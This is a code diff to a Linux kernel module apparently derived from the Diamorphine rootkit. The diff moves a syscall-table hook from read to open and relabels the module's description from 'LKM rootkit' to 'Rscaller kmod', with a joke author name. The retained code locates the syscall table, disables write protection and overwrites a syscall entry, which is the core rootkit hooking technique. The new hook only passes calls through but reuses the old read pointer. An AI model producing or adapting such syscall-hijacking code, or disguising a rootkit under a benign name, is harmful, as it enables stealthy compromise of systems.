@@ -31,11 +31,6 @@ get_syscall_table_bf(void)
 }
 
 
-asmlinkage int
-hooked_read(const struct pt_regs *pt_regs)
-{
-	return orig_read(pt_regs);
-}
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 static inline void
@@ -80,6 +75,16 @@ unprotect_memory(void)
 #endif
 }
 
+
+
+asmlinkage int
+hooked_open(const struct pt_regs *pt_regs)
+{
+	return orig_read(pt_regs);
+}
+
+int syscall_num = __NR_open;
+
 static int __init
 diamorphine_init(void)
 {
@@ -96,11 +101,11 @@ diamorphine_init(void)
 #endif
 
 
-	orig_read = (t_syscall)__sys_call_table[__NR_read];
+	orig_read = (t_syscall)__sys_call_table[syscall_num];
 
 	unprotect_memory();
 
-	__sys_call_table[__NR_read] = (unsigned long) hooked_read;
+	__sys_call_table[syscall_num] = (unsigned long) hooked_open;
 
 	protect_memory();
 
@@ -112,7 +117,7 @@ diamorphine_cleanup(void)
 {
 	unprotect_memory();
 
-	__sys_call_table[__NR_read] = (unsigned long) orig_read;
+	__sys_call_table[syscall_num] = (unsigned long) orig_read;
 
 	protect_memory();
 }
@@ -121,5 +126,5 @@ module_init(diamorphine_init);
 module_exit(diamorphine_cleanup);
 
 MODULE_LICENSE("Dual BSD/GPL");
-MODULE_AUTHOR("m0nad");
-MODULE_DESCRIPTION("LKM rootkit");
+MODULE_AUTHOR("your mom");
+MODULE_DESCRIPTION("Rscaller kmod");
